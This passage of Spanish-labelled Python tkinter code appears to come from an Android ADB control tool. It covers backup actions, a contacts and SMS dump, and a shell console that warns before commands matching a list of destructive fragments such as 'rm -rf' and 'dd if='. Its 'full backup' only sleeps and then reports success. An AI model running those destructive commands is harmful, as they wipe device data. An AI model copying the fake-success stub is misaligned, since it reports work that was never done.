        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo")
            return
        self.toggle_persistent()
    
    def restore_network(self):
        """Restaurar red"""
        self.restore_all()
    
    # ==================== FUNCIONES BACKUP ====================
    
    def select_backup_folder(self):
        """Seleccionar carpeta de backup"""
        folder = filedialog.askdirectory()
        if folder:
            self.backup_path.delete(0, tk.END)
            self.backup_path.insert(0, folder)
    
    def full_backup(self):
        """Backup completo"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        
        if not messagebox.askyesno("Confirmar", "¿Realizar backup completo? Esto puede tomar varios minutos."):
            return
        
        self.show_backup_progress(True)
        self.backup_status.config(text="Realizando backup completo...")
        self.log("💾 Iniciando backup completo...")
        
        def do_backup():
            import time
            time.sleep(2)
            self.root.after(0, lambda: self.show_backup_progress(False))
            self.root.after(0, lambda: self.backup_status.config(text="✅ Backup completado"))
            self.root.after(0, lambda: self.log("✅ Backup completado"))
            self.root.after(3000, lambda: self.backup_status.config(text=""))
        
        threading.Thread(target=do_backup, daemon=True).start()
    
    def apps_backup(self):
        """Backup de apps"""
        messagebox.showinfo("Info", "Función en desarrollo - Próxima actualización")
    
    def media_backup(self):
        """Backup de media"""
        messagebox.showinfo("Info", "Función en desarrollo - Próxima actualización")
    
    def contacts_backup(self):
        """Backup de contactos"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        
        self.show_backup_progress(True)
        self.backup_status.config(text="Respaldando contactos y SMS...")
        
        def do_backup():
            self.core.dump_contacts()
            self.core.dump_sms()
            self.root.after(0, lambda: self.show_backup_progress(False))
            self.root.after(0, lambda: self.backup_status.config(text="✅ Contactos y SMS respaldados"))
            self.root.after(3000, lambda: self.backup_status.config(text=""))
        
        threading.Thread(target=do_backup, daemon=True).start()
    
    def restore_backup(self):
        """Restaurar backup"""
        messagebox.showinfo("Info", "Función en desarrollo - Próxima actualización")
    
    # ==================== CONSOLA ====================
    
    def execute_adb_command(self, event):
        """Ejecutar comando ADB"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        
        cmd = self.cmd_entry.get().strip()
        if cmd:
            # Comandos peligrosos requieren confirmación
            dangerous = ['rm -rf', 'dd if=', 'format', 'reboot', 'shutdown']
            if any(d in cmd.lower() for d in dangerous):
                if not messagebox.askyesno("⚠️ ADVERTENCIA", f"El comando '{cmd}' es potencialmente peligroso.\n¿Estás seguro?"):
                    self.cmd_entry.delete(0, tk.END)
                    return
            
            self.log(f"$> adb shell {cmd}")
            result = self.core.adb_controller.execute_shell(cmd)
            self.console.insert(tk.END, f"{result}\n\n")
            self.cmd_entry.delete(0, tk.END)
            self.console.see(tk.END)